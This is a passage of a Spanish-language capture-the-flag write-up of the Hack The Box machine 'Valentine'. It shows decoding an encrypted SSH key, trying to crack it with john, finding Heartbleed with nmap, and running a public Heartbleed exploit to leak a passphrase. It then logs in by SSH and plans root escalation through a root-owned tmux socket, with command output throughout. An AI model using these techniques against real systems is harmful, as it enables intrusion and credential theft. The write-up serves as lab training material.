&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;❯ echo &quot;2d 2d 2d 2d 2d 42 45 47 49 4e 20 52 53 41 20 50 52 49 56 41 54 45 20 4b 45 59 2d 2d 2d 2d 2d 0d 0a 50 72 6f 63 2d 54 79 70 65 3a 20 34 2c 45 4e 43 52 59 50 54 45 44 0d 0a 44 45 4b 2d 49 6e 66 6f 3a 20 41 45 53 2d 31 32 38 2d 43 42 43 2c 41 45 42 38 38 43 31 34 30 46 36 39 42 46 32 30 37 34 37 38 38 44 45 32 34 41 45 34 38 44 34 36 0d 0a 0d 0a 44 62 50 72 4f 37 38 6b 65 67 4e 75 6b 31 44 41 71 6c 41 4e 35 6a 62 6a 58 76 30 50 50 73 6f 67 33 6a 64 62 4d 46 53 38 69 45 39 70 33 55 4f 4c 30 6c 46 30 78 66 37 50 7a 6d 72 6b 44 61 38 52 0d 0a 35 79 2f 62 34 36 2b 39 6e 45 70 43 4d 66 54 50 68 4e 75 4a 52 63 57 32 55 32 67 4a 63 4f 46 48 2b 39 52 4a 44 42 43 35 55 4a 4d 55 53 31 2f 67 6a 42 2f 37 2f 4d 79 30 30 4d 77 78 2b 61 49 36 0d 0a 30 45 49 30 53 62 4f 59 55 41 56 31 57 34 45 56 37 6d 39 36 51 73 5a 6a 72 77 4a 76 6e 6a 56 61 66 6d 36 56 73 4b 61 54 50 42 48 70 75 67 63 41 53 76 4d 71 7a 37 36 57 36 61 62 52 5a 65 58 69 0d 0a 45 62 77 36 36 68 6a 46 6d 41 75 34 41 7a 71 63 4d 2f 6b 69 67 4e 52 46 50 59 75 4e 69 58 72 58 73 31 77 2f 64 65 4c 43 71 43 4a 2b 45 61 31 54 38 7a 6c 61 73 36 66 63 6d 68 4d 38 41 2b 38 50 0d 0a 4f 58 42 4b 4e 65 36 6c 31 37 68 4b 61 54 36 77 46 6e 70 35 65 58 4f 61 55 49 48 76 48 6e 76 4f 36 53 63 48 56 57 52 72 5a 37 30 66 63 70 63 70 69 6d 4c 31 77 31 33 54 67 64 64 32 41 69 47 64 0d 0a 70 48 4c 4a 70 59 55 49 49 35 50 75 4f 36 78 2b 4c 53 38 6e 31 72 2f 47 57 4d 71 53 4f 45 69 6d 4e 52 44 31 6a 2f 35 39 2f 34 75 33 52 4f 72 54 43 4b 65 6f 39 44 73 54 52 71 73 32 6b 31 53 48 0d 0a 51 64 57 77 46 77 61 58 62 59 79 54 31 75 78 41 4d 53 6c 35 48 71 39 4f 44 35 48 4a 38 47 30 52 36 4a 49 35 52 76 43 4e 55 51 6a 77 78 30 46 49 54 6a 6a 4d 6a 6e 4c 49 70 78 6a 76 66 71 2b 45 0d 0a 70 30 67 44 30 55 63 79 6c 4b 6d 36 72 43 5a 71 61 63 77 6e 53 64 64 48 57 38 57 33 4c 78 4a 6d 43 78 64 78 57 35 6c 74 35 64 50 6a 41 6b 42 59 52 55 6e 6c 39 31 45 53 43 69 44 34 5a 2b 75 43 0d 0a 4f 6c 36 6a 4c 46 44 32 6b 61 4f 4c 66 75 79 65 65 30 66 59 43 62 37 47 54 71 4f 65 37 45 6d 4d 42 33 66 47 49 77 53 64 57 38 4f 43 38 4e 57 54 6b 77 70 6a 63 30 45 4c 62 6c 55 61 36 75 6c 4f 0d 0a 74 39 67 72 53 6f 73 52 54 43 73 5a 64 31 34 4f 50 74 73 34 62 4c 73 70 4b 78 4d 4d 4f 73 67 6e 4b 6c 6f 58 76 6e 6c 50 4f 53 77 53 70 57 79 39 57 70 36 79 38 58 58 38 2b 46 34 30 72 78 6c 35 0d 0a 58 71 68 44 55 42 68 79 6b 31 43 33 59 50 4f 69 44 75 50 4f 6e 4d 58 61 49 70 65 31 64 67 62 30 4e 64 44 31 4d 39 5a 51 53 4e 55 4c 77 31 44 48 43 47 50 50 34 4a 53 53 78 58 37 42 57 64 44 4b 0d 0a 61 41 6e 57 4a 76 46 67 6c 41 34 6f 46 42 42 56 41 38 75 41 50 4d 66 56 32 58 46 51 6e 6a 77 55 54 35 62 50 4c 43 36 35 74 46 73 74 6f 52 74 54 5a 31 75 53 72 75 61 69 32 37 6b 78 54 6e 4c 51 0d 0a 2b 77 51 38 37 6c 4d 61 64 64 73 31 47 51 4e 65 47 73 4b 53 66 38 52 2f 72 73 52 4b 65 65 4b 63 69 6c 44 65 50 43 6a 65 61 4c 71 74 71 78 6e 68 4e 6f 46 74 67 30 4d 78 74 36 72 32 67 62 31 45 0d 0a 41 6c 6f 51 36 6a 67 35 54 62 6a 35 4a 37 71 75 59 58 5a 50 79 6c 42 6c 6a 4e 70 39 47 56 70 69 6e 50 63 33 4b 70 48 74 74 76 67 62 70 74 66 69 57 45 45 73 5a 59 6e 35 79 5a 50 68 55 72 39 51 0d 0a 72 30 38 70 6b 4f 78 41 72 58 45 32 64 6a 37 65 58 2b 62 71 36 35 36 33 35 4f 4a 36 54 71 48 62 41 6c 54 51 31 52 73 39 50 75 6c 72 53 37 4b 34 53 4c 58 37 6e 59 38 39 2f 52 5a 35 6f 53 51 65 0d 0a 32 56 57 52 79 54 5a 31 46 66 6e 67 4a 53 73 76 39 2b 4d 66 76 7a 33 34 31 6c 62 7a 4f 49 57 6d 6b 37 57 66 45 63 57 63 48 63 31 36 6e 39 56 30 49 62 53 4e 41 4c 6e 6a 54 68 76 45 63 50 6b 79 0d 0a 65 31 42 73 66 53 62 73 66 39 46 67 75 55 5a 6b 67 48 41 6e 6e 66 52 4b 6b 47 56 47 31 4f 56 79 75 77 63 2f 4c 56 6a 6d 62 68 5a 7a 4b 77 4c 68 61 5a 52 4e 64 38 48 45 4d 38 36 66 4e 6f 6a 50 0d 0a 30 39 6e 56 6a 54 61 59 74 57 55 58 6b 30 53 69 31 57 30 32 77 62 75 31 4e 7a 4c 2b 31 54 67 39 49 70 4e 79 49 53 46 43 46 59 6a 53 71 69 79 47 2b 57 55 37 49 77 4b 33 59 55 35 6b 70 33 43 43 0d 0a 64 59 53 63 7a 36 33 51 32 70 51 61 66 78 66 53 62 75 76 34 43 4d 6e 4e 70 64 69 72 56 4b 45 6f 35 6e 52 52 66 4b 2f 69 61 4c 33 58 31 52 33 44 78 56 38 65 53 59 46 4b 46 4c 36 70 71 70 75 58 0d 0a 63 59 35 59 5a 4a 47 41 70 2b 4a 78 73 6e 49 51 39 43 46 79 78 49 74 39 32 66 72 58 7a 6e 73 6a 68 6c 59 61 38 73 76 62 56 4e 4e 66 6b 2f 39 66 79 58 36 6f 70 32 34 72 4c 32 44 79 45 53 70 59 0d 0a 70 6e 73 75 6b 42 43 46 42 6b 5a 48 57 4e 4e 79 65 4e 37 62 35 47 68 54 56 43 6f 64 48 68 7a 48 56 46 65 68 54 75 42 72 70 2b 56 75 50 71 61 71 44 76 4d 43 56 65 31 44 5a 43 62 34 4d 6a 41 6a 0d 0a 4d 73 6c 66 2b 39 78 4b 2b 54 58 45 4c 33 69 63 6d 49 4f 42 52 64 50 79 77 36 65 2f 4a 6c 51 6c 56 52 6c 6d 53 68 46 70 49 38 65 62 2f 38 56 73 54 79 4a 53 65 2b 62 38 35 33 7a 75 56 32 71 4c 0d 0a 73 75 4c 61 42 4d 78 59 4b 6d 33 2b 7a 45 44 49 44 76 65 4b 50 4e 61 61 57 5a 67 45 63 71 78 79 6c 43 43 2f 77 55 79 55 58 6c 4d 4a 35 30 4e 77 36 4a 4e 56 4d 4d 38 4c 65 43 69 69 33 4f 45 57 0d 0a 6c 30 6c 6e 39 4c 31 62 2f 4e 58 70 48 6a 47 61 38 57 48 48 54 6a 6f 49 69 6c 42 35 71 4e 55 79 79 77 53 65 54 42 46 32 61 77 52 6c 58 48 39 42 72 6b 5a 47 34 46 63 34 67 64 6d 57 2f 49 7a 54 0d 0a 52 55 67 5a 6b 62 4d 51 5a 4e 49 49 66 7a 6a 31 51 75 69 6c 52 56 42 6d 2f 46 37 36 59 2f 59 4d 72 6d 6e 4d 39 6b 2f 31 78 53 47 49 73 6b 77 43 55 51 2b 39 35 43 47 48 4a 45 38 4d 6b 68 44 33 0d 0a 2d 2d 2d 2d 2d 45 4e 44 20 52 53 41 20 50 52 49 56 41 54 45 20 4b 45 59 2d 2d 2d 2d 2d
&quot; | xxd -ps -r; echo
-----BEGIN RSA PRIVATE KEY-----
Proc-Type: 4,ENCRYPTED
DEK-Info: AES-128-CBC,AEB88C140F69BF2074788DE24AE48D46

DbPrO78kegNuk1DAqlAN5jbjXv0PPsog3jdbMFS8iE9p3UOL0lF0xf7PzmrkDa8R
5y/b46+9nEpCMfTPhNuJRcW2U2gJcOFH+9RJDBC5UJMUS1/gjB/7/My00Mwx+aI6
0EI0SbOYUAV1W4EV7m96QsZjrwJvnjVafm6VsKaTPBHpugcASvMqz76W6abRZeXi
Ebw66hjFmAu4AzqcM/kigNRFPYuNiXrXs1w/deLCqCJ+Ea1T8zlas6fcmhM8A+8P
OXBKNe6l17hKaT6wFnp5eXOaUIHvHnvO6ScHVWRrZ70fcpcpimL1w13Tgdd2AiGd
pHLJpYUII5PuO6x+LS8n1r/GWMqSOEimNRD1j/59/4u3ROrTCKeo9DsTRqs2k1SH
QdWwFwaXbYyT1uxAMSl5Hq9OD5HJ8G0R6JI5RvCNUQjwx0FITjjMjnLIpxjvfq+E
p0gD0UcylKm6rCZqacwnSddHW8W3LxJmCxdxW5lt5dPjAkBYRUnl91ESCiD4Z+uC
Ol6jLFD2kaOLfuyee0fYCb7GTqOe7EmMB3fGIwSdW8OC8NWTkwpjc0ELblUa6ulO
t9grSosRTCsZd14OPts4bLspKxMMOsgnKloXvnlPOSwSpWy9Wp6y8XX8+F40rxl5
XqhDUBhyk1C3YPOiDuPOnMXaIpe1dgb0NdD1M9ZQSNULw1DHCGPP4JSSxX7BWdDK
aAnWJvFglA4oFBBVA8uAPMfV2XFQnjwUT5bPLC65tFstoRtTZ1uSruai27kxTnLQ
+wQ87lMadds1GQNeGsKSf8R/rsRKeeKcilDePCjeaLqtqxnhNoFtg0Mxt6r2gb1E
AloQ6jg5Tbj5J7quYXZPylBljNp9GVpinPc3KpHttvgbptfiWEEsZYn5yZPhUr9Q
r08pkOxArXE2dj7eX+bq65635OJ6TqHbAlTQ1Rs9PulrS7K4SLX7nY89/RZ5oSQe
2VWRyTZ1FfngJSsv9+Mfvz341lbzOIWmk7WfEcWcHc16n9V0IbSNALnjThvEcPky
e1BsfSbsf9FguUZkgHAnnfRKkGVG1OVyuwc/LVjmbhZzKwLhaZRNd8HEM86fNojP
09nVjTaYtWUXk0Si1W02wbu1NzL+1Tg9IpNyISFCFYjSqiyG+WU7IwK3YU5kp3CC
dYScz63Q2pQafxfSbuv4CMnNpdirVKEo5nRRfK/iaL3X1R3DxV8eSYFKFL6pqpuX
cY5YZJGAp+JxsnIQ9CFyxIt92frXznsjhlYa8svbVNNfk/9fyX6op24rL2DyESpY
pnsukBCFBkZHWNNyeN7b5GhTVCodHhzHVFehTuBrp+VuPqaqDvMCVe1DZCb4MjAj
Mslf+9xK+TXEL3icmIOBRdPyw6e/JlQlVRlmShFpI8eb/8VsTyJSe+b853zuV2qL
suLaBMxYKm3+zEDIDveKPNaaWZgEcqxylCC/wUyUXlMJ50Nw6JNVMM8LeCii3OEW
l0ln9L1b/NXpHjGa8WHHTjoIilB5qNUyywSeTBF2awRlXH9BrkZG4Fc4gdmW/IzT
RUgZkbMQZNIIfzj1QuilRVBm/F76Y/YMrmnM9k/1xSGIskwCUQ+95CGHJE8MkhD3
-----END RSA PRIVATE KEY-----
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Obtenemos una clave &lt;code&gt;id_rsa&lt;/code&gt; que esta encriptada, asi que con &lt;code&gt;ssh2john&lt;/code&gt; vamos a obtener un hash de la clave y con &lt;code&gt;john&lt;/code&gt; trataremos de decencriptarla y obtener la contraseña.&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;❯ /usr/share/john/ssh2john.py id_rsa
id_rsa:$sshng$1$16$AEB88C140F69BF2074788DE24AE48D46$1200$0db3eb3bbf247a036e9350c0aa500de636e35efd0f3eca20de375b3054bc884f69dd438bd25174c5fecfce6ae40daf11e72fdbe3afbd9c4a4231f4cf84db8945c5b653680970e147fbd4490c10b95093144b5fe08c1ffbfcccb4d0cc31f9a23ad0423449b3985005755b8115ee6f7a42c663af026f9e355a7e6e95b0a6933c11e9ba07004af32acfbe96e9a6d165e5e211bc3aea18c5980bb8033a9c33f92280d4453d8b8d897ad7b35c3f75e2c2a8227e11ad53f3395ab3a7dc9a133c03ef0f39704a35eea5d7b84a693eb0167a7979739a5081ef1e7bcee9270755646b67bd1f7297298a62f5c35dd381d77602219da472c9a585082393ee3bac7e2d2f27d6bfc658ca923848a63510f58ffe7dff8bb744ead308a7a8f43b1346ab3693548741d5b01706976d8c93d6ec403129791eaf4e0f91c9f06d11e8923946f08d5108f0c741484e38cc8e72c8a718ef7eaf84a74803d1473294a9baac266a69cc2749d7475bc5b72f12660b17715b996de5d3e30240584549e5f751120a20f867eb823a5ea32c50f691a38b7eec9e7b47d809bec64ea39eec498c0777c623049d5bc382f0d593930a6373410b6e551aeae94eb7d82b4a8b114c2b19775e0e3edb386cbb292b130c3ac8272a5a17be794f392c12a56cbd5a9eb2f175fcf85e34af19795ea8435018729350b760f3a20ee3ce9cc5da2297b57606f435d0f533d65048d50bc350c70863cfe09492c57ec159d0ca6809d626f160940e2814105503cb803cc7d5d971509e3c144f96cf2c2eb9b45b2da11b53675b92aee6a2dbb9314e72d0fb043cee531a75db3519035e1ac2927fc47faec44a79e29c8a50de3c28de68baadab19e136816d834331b7aaf681bd44025a10ea38394db8f927baae61764fca50658cda7d195a629cf7372a91edb6f81ba6d7e258412c6589f9c993e152bf50af4f2990ec40ad7136763ede5fe6eaeb9eb7e4e27a4ea1db0254d0d51b3d3ee96b4bb2b848b5fb9d8f3dfd1679a1241ed95591c9367515f9e0252b2ff7e31fbf3df8d656f33885a693b59f11c59c1dcd7a9fd57421b48d00b9e34e1bc470f9327b506c7d26ec7fd160b946648070279df44a906546d4e572bb073f2d58e66e16732b02e169944d77c1c433ce9f3688cfd3d9d58d3698b565179344a2d56d36c1bbb53732fed5383d2293722121421588d2aa2c86f9653b2302b7614e64a7708275849ccfadd0da941a7f17d26eebf808c9cda5d8ab54a128e674517cafe268bdd7d51dc3c55f1e49814a14bea9aa9b97718e58649180a7e271b27210f42172c48b7dd9fad7ce7b2386561af2cbdb54d35f93ff5fc97ea8a76e2b2f60f2112a58a67b2e90108506464758d37278dedbe46853542a1d1e1cc75457a14ee06ba7e56e3ea6aa0ef30255ed436426f832302332c95ffbdc4af935c42f789c98838145d3f2c3a7bf2654255519664a116923c79bffc56c4f22527be6fce77cee576a8bb2e2da04cc582a6dfecc40c80ef78a3cd69a59980472ac729420bfc14c945e5309e74370e8935530cf0b7828a2dce116974967f4bd5bfcd5e91e319af161c74e3a088a5079a8d532cb049e4c11766b04655c7f41ae4646e0573881d996fc8cd345481991b31064d2087f38f542e8a5455066fc5efa63f60cae69ccf64ff5c52188b24c02510fbde42187244f0c9210f7
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Ahora si tratamos de crackear el hash con &lt;code&gt;john&lt;/code&gt; haciendo uso del &lt;code&gt;rockyou.txt&lt;/code&gt;, vemos que no podemos obtener la contraseña.&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;❯ john --wordlist=/usr/share/wordlists/rockyou.txt hash
Using default input encoding: UTF-8
Loaded 1 password hash (SSH [RSA/DSA/EC/OPENSSH (SSH private keys) 32/64])
Cost 1 (KDF/cipher [0=MD5/AES 1=MD5/3DES 2=Bcrypt/AES]) is 0 for all loaded hashes
Cost 2 (iteration count) is 1 for all loaded hashes
Will run 4 OpenMP threads
Note: This format may emit false positives, so it will keep trying even after
finding a possible candidate.
Press 'q' or Ctrl-C to abort, almost any other key for status
Warning: Only 2 candidates left, minimum 4 needed for performance.
0g 0:00:00:03 DONE (2023-06-24 23:29) 0g/s 4039Kp/s 4039Kc/s 4039KC/sa6_123..*7¡Vamos!
Session completed
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Como no encontramos nada, vamos a usar los scripts &lt;code&gt;vuln and safe&lt;/code&gt; de nmap para tratar de encontrar vulnerabilidades asociadas al ssl del servicio web.&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;❯ nmap --script &quot;vuln and safe&quot; -p443 10.10.10.79 -oN sslScan
Starting Nmap 7.92 ( https://nmap.org ) at 2023-06-24 23:34 GMT
Nmap scan report for 10.10.10.79
Host is up (0.11s latency).

PORT    STATE SERVICE
443/tcp open  https
| ssl-ccs-injection: 
|   VULNERABLE:
|   SSL/TLS MITM vulnerability (CCS Injection)
|     State: VULNERABLE
|     Risk factor: High
|       OpenSSL before 0.9.8za, 1.0.0 before 1.0.0m, and 1.0.1 before 1.0.1h
|       does not properly restrict processing of ChangeCipherSpec messages,
|       which allows man-in-the-middle attackers to trigger use of a zero
|       length master key in certain OpenSSL-to-OpenSSL communications, and
|       consequently hijack sessions or obtain sensitive information, via
|       a crafted TLS handshake, aka the &quot;CCS Injection&quot; vulnerability.
|           
|     References:
|       http://www.openssl.org/news/secadv_20140605.txt
|       http://www.cvedetails.com/cve/2014-0224
|_      https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2014-0224
| ssl-heartbleed: 
|   VULNERABLE:
|   The Heartbleed Bug is a serious vulnerability in the popular OpenSSL cryptographic software library. It allows for stealing information intended to be protected by SSL/TLS encryption.
|     State: VULNERABLE
|     Risk factor: High
|       OpenSSL versions 1.0.1 and 1.0.2-beta releases (including 1.0.1f and 1.0.2-beta1) of OpenSSL are affected by the Heartbleed bug. The bug allows for reading memory of systems protected by the vulnerable OpenSSL versions and could allow for disclosure of otherwise encrypted confidential information as well as the encryption keys themselves.
|           
|     References:
|       http://cvedetails.com/cve/2014-0160/
|       http://www.openssl.org/news/secadv_20140407.txt 
|_      https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2014-0160
| ssl-poodle: 
|   VULNERABLE:
|   SSL POODLE information leak
|     State: VULNERABLE
|     IDs:  BID:70574  CVE:CVE-2014-3566
|           The SSL protocol 3.0, as used in OpenSSL through 1.0.1i and other
|           products, uses nondeterministic CBC padding, which makes it easier
|           for man-in-the-middle attackers to obtain cleartext data via a
|           padding-oracle attack, aka the &quot;POODLE&quot; issue.
|     Disclosure date: 2014-10-14
|     Check results:
|       TLS_RSA_WITH_AES_128_CBC_SHA
|     References:
|       https://www.securityfocus.com/bid/70574
|       https://www.imperialviolet.org/2014/10/14/poodle.html
|       https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2014-3566
|_      https://www.openssl.org/~bodo/ssl-poodle.pdf

Nmap done: 1 IP address (1 host up) scanned in 25.45 seconds
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;El escaneo nos reporta que el servicio es vulnerable a &lt;code&gt;Heartbleed&lt;/code&gt;&lt;/p&gt;

&lt;blockquote&gt;
  &lt;p&gt;Heartbleed: La extensión Heartbeat para los protocolos Transport Layer Security y Datagram Transport Layer Security se propuso como un estándar en febrero del 2012 por el RFC 6520. Esto provee una forma de probar y mantener viva un enlace de comunicación segura sin la necesidad de renegociar la conexión cada vez.&lt;/p&gt;
&lt;/blockquote&gt;

&lt;p&gt;La vulnerabilidad se da en la versión 1.0.1 y consiste basicamente en que permite a un atacante leer la memoria de un servidor o un cliente y permitiendo por ejemplo conseguir las claves privadas ssl.&lt;/p&gt;

&lt;p&gt;A continuación un articulo donde puedes investigar mas a detalle:&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;&lt;a href=&quot;https://es.wikipedia.org/wiki/Heartbleed&quot;&gt;https://es.wikipedia.org/wiki/Heartbleed&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;Para explotar la vulnerabilidad, vamos a usar el exploit de &lt;code&gt;akhld&lt;/code&gt; de github.&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;&lt;a href=&quot;https://github.com/akhld/heartbleed&quot;&gt;https://github.com/akhld/heartbleed&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;Nos descargamos el repositorio y ejecutamos el &lt;code&gt;exploit&lt;/code&gt; con los parametros correspondientes.&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;❯ python2 heartbleed.py 10.10.10.79 -p 443  | grep -v &quot;00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00&quot;
Connecting...
Sending Client Hello...
Waiting for Server Hello...
 ... received message: type = 22, ver = 0302, length = 66
 ... received message: type = 22, ver = 0302, length = 885
 ... received message: type = 22, ver = 0302, length = 331
 ... received message: type = 22, ver = 0302, length = 4
Sending heartbeat request...
 ... received message: type = 24, ver = 0302, length = 16384
Received heartbeat response:
  0000: 02 40 00 D8 03 02 53 43 5B 90 9D 9B 72 0B BC 0C  .@....SC[...r...
  0010: BC 2B 92 A8 48 97 CF BD 39 04 CC 16 0A 85 03 90  .+..H...9.......
  0020: 9F 77 04 33 D4 DE 00 00 66 C0 14 C0 0A C0 22 C0  .w.3....f.....&quot;.
  0030: 21 00 39 00 38 00 88 00 87 C0 0F C0 05 00 35 00  !.9.8.........5.
  0040: 84 C0 12 C0 08 C0 1C C0 1B 00 16 00 13 C0 0D C0  ................
  0050: 03 00 0A C0 13 C0 09 C0 1F C0 1E 00 33 00 32 00  ............3.2.
  0060: 9A 00 99 00 45 00 44 C0 0E C0 04 00 2F 00 96 00  ....E.D...../...
  0070: 41 C0 11 C0 07 C0 0C C0 02 00 05 00 04 00 15 00  A...............
  0080: 12 00 09 00 14 00 11 00 08 00 06 00 03 00 FF 01  ................
  0090: 00 00 49 00 0B 00 04 03 00 01 02 00 0A 00 34 00  ..I...........4.
  00a0: 32 00 0E 00 0D 00 19 00 0B 00 0C 00 18 00 09 00  2...............
  00b0: 0A 00 16 00 17 00 08 00 06 00 07 00 14 00 15 00  ................
  00c0: 04 00 05 00 12 00 13 00 01 00 02 00 03 00 0F 00  ................
  00d0: 10 00 11 00 23 00 00 00 0F 00 01 01 30 2E 30 2E  ....#.......0.0.
  00e0: 31 2F 64 65 63 6F 64 65 2E 70 68 70 0D 0A 43 6F  1/decode.php..Co
  00f0: 6E 74 65 6E 74 2D 54 79 70 65 3A 20 61 70 70 6C  ntent-Type: appl
  0100: 69 63 61 74 69 6F 6E 2F 78 2D 77 77 77 2D 66 6F  ication/x-www-fo
  0110: 72 6D 2D 75 72 6C 65 6E 63 6F 64 65 64 0D 0A 43  rm-urlencoded..C
  0120: 6F 6E 74 65 6E 74 2D 4C 65 6E 67 74 68 3A 20 34  ontent-Length: 4
  0130: 32 0D 0A 0D 0A 24 74 65 78 74 3D 61 47 56 68 63  2....$text=aGVhc
  0140: 6E 52 69 62 47 56 6C 5A 47 4A 6C 62 47 6C 6C 64  nRibGVlZGJlbGlld
  0150: 6D 56 30 61 47 56 6F 65 58 42 6C 43 67 3D 3D 8E  mV0aGVoeXBlCg==.
  0160: EB D0 07 D2 E4 B9 3C 25 BC FE FB 22 D8 4A AC 41  ......&amp;lt;%...&quot;.J.A
  0170: BC 2D 71 0C 0C 0C 0C 0C 0C 0C 0C 0C 0C 0C 0C 0C  .-q.............

WARNING: server returned more data than it should - server is vulnerable!
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;El exploit funciona correctamente, vemos que se filtra cadenas de información y una de ellas corresponde a un formato en base64 &lt;code&gt;aGVhcnRibGVlZGJlbGlldmV0aGVoeXBlCg==&lt;/code&gt;.&lt;/p&gt;

&lt;p&gt;Si ahora tratamos de decodear la cadena, obtnemos un texto que parece corresponde a una contraseña.&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;❯ echo &quot;aGVhcnRibGVlZGJlbGlldmV0aGVoeXBlCg==&quot; | base64 -d
heartbleedbelievethehype
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Podemos tratar de conectarnos por &lt;code&gt;ssh&lt;/code&gt; ya que tenemos la contraseña, pero como no sabemos el usuario al que corresponde, haciendo un poco de &lt;code&gt;guessing&lt;/code&gt; podemos probar con las palabras de la contraseña que obtuvimos.&lt;/p&gt;

&lt;p&gt;Probamos conectarnos como el usuario &lt;code&gt;hype&lt;/code&gt;, sin olvidar antes dar el permiso 600 a la &lt;code&gt;id_rsa&lt;/code&gt;.&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;❯ ssh -i id_rsa hype@10.10.10.79
Enter passphrase for key 'id_rsa': 
Welcome to Ubuntu 12.04 LTS (GNU/Linux 3.2.0-23-generic x86_64)

 * Documentation:  https://help.ubuntu.com/

New release '14.04.5 LTS' available.
Run 'do-release-upgrade' to upgrade to it.

Last login: Fri Feb 16 14:50:29 2018 from 10.10.14.3
hype@Valentine:~$ whoami
hype
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;y obtenemos acceso como el usuario &lt;code&gt;hype&lt;/code&gt;, ahora podemos visualizar la primera flag &lt;code&gt;user.txt&lt;/code&gt;.&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;hype@Valentine:~$ cd /home
hype@Valentine:/home$ ls
hype
hype@Valentine:/home$ cd hype/
hype@Valentine:~$ cat user.txt 
a2d0b5e323869d9205016e1fb7a5630f
&lt;/code&gt;&lt;/pre&gt;
&lt;h2 id=&quot;escalada-de-privilegios&quot;&gt;ELEVACION DE PRIVILEGIOS &lt;a href=&quot;#escalada-de-privilegios&quot;&gt;#&lt;/a&gt;&lt;/h2&gt;

&lt;p&gt;Para elevar privilegios como el usuario podemos hacerlo de dos formas.&lt;/p&gt;

&lt;p&gt;Primero vamos a hacer de la primera manera que es que si revisamos los archivos ocultos del directorio del usuario &lt;code&gt;hype&lt;/code&gt;. Podemos observar que el &lt;code&gt;.bash_history&lt;/code&gt; no es un link simbolico al &lt;code&gt;/dev/null&lt;/code&gt; como de costumbre.&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;ype@Valentine:~$ ls -la
total 148
drwxr-xr-x 21 hype hype  4096 Aug 25  2022 .
drwxr-xr-x  3 root root  4096 Dec 11  2017 ..
-rw-------  1 hype hype   636 Dec 11  2017 .ICEauthority
-rw-------  1 hype hype     0 Dec 11  2017 .Xauthority
-rw-------  1 hype hype   131 Feb 16  2018 .bash_history
-rw-r--r--  1 hype hype   220 Dec 11  2017 .bash_logout
-rw-r--r--  1 hype hype  3486 Dec 11  2017 .bashrc
drwx------ 11 hype hype  4096 Dec 11  2017 .cache
drwx------  9 hype hype  4096 Dec 11  2017 .config
drwx------  3 hype hype  4096 Dec 11  2017 .dbus
-rw-r--r--  1 hype hype    26 Dec 11  2017 .dmrc
drwxr-xr-x  2 hype hype  4096 Dec 11  2017 .fontconfig
drwx------  3 hype hype  4096 Dec 11  2017 .gconf
drwx------  4 hype hype  4096 Dec 11  2017 .gnome2
-rw-rw-r--  1 hype hype   132 Dec 11  2017 .gtk-bookmarks
drwx------  2 hype hype  4096 Dec 11  2017 .gvfs
drwxr-xr-x  3 hype hype  4096 Dec 11  2017 .local
drwx------  3 hype hype  4096 Dec 11  2017 .mission-control
-rw-r--r--  1 hype hype   675 Dec 11  2017 .profile
drwx------  2 hype hype  4096 Dec 11  2017 .pulse
-rw-------  1 hype hype   256 Dec 11  2017 .pulse-cookie
drwx------  2 hype hype  4096 Dec 13  2017 .ssh
-rw-r--r--  1 root root    39 Dec 13  2017 .tmux.conf
-rw-------  1 hype hype 12173 Dec 11  2017 .xsession-errors
-rw-------  1 hype hype  9659 Dec 11  2017 .xsession-errors.old
drwxr-xr-x  2 hype hype  4096 Aug 25  2022 Desktop
drwxr-xr-x  2 hype hype  4096 Dec 11  2017 Documents
drwxr-xr-x  2 hype hype  4096 Dec 11  2017 Downloads
drwxr-xr-x  2 hype hype  4096 Dec 11  2017 Music
drwxr-xr-x  2 hype hype  4096 Dec 11  2017 Pictures
drwxr-xr-x  2 hype hype  4096 Dec 11  2017 Public
drwxr-xr-x  2 hype hype  4096 Dec 11  2017 Templates
drwxr-xr-x  2 hype hype  4096 Dec 11  2017 Videos
-rw-rw-r--  1 hype hype    33 Jun 24 15:47 user.txt
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Si vemos el contenido del archivo, podemos los comandos que ejecuto el usuario entre ellos, unos de &lt;code&gt;tmux&lt;/code&gt;.&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;hype@Valentine:~$ cat .bash_history 

exit
exot
exit
ls -la
cd /
ls -la
cd .devs
ls -la
tmux -L dev_sess 
tmux a -t dev_sess 
tmux --help
tmux -S /.devs/dev_sess 
exit
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Entre los comandos usados con &lt;code&gt;tmux&lt;/code&gt;, vemos que uno de ellos hace alución a un &lt;code&gt;socket file&lt;/code&gt;, que basicamente viene a ser una sesión en modo &lt;code&gt;detached&lt;/code&gt;.&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;hype@Valentine:~$ ls -l /.devs/dev_sess
srw-rw---- 1 root hype 0 Jun 24 15:47 /.devs/dev_sess
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Como vemos que el usuario &lt;code&gt;root&lt;/code&gt; a abierto una sesión que a almacenado a un &lt;code&gt;socket file&lt;/code&gt; y este tiene como grupo asignado a &lt;code&gt;hype&lt;/code&gt;, podemos asociarnos al &lt;code&gt;socket file&lt;/code&gt; y nos convertiriamos en &lt;code&gt;root&lt;/code&gt;.&lt;/p&gt;

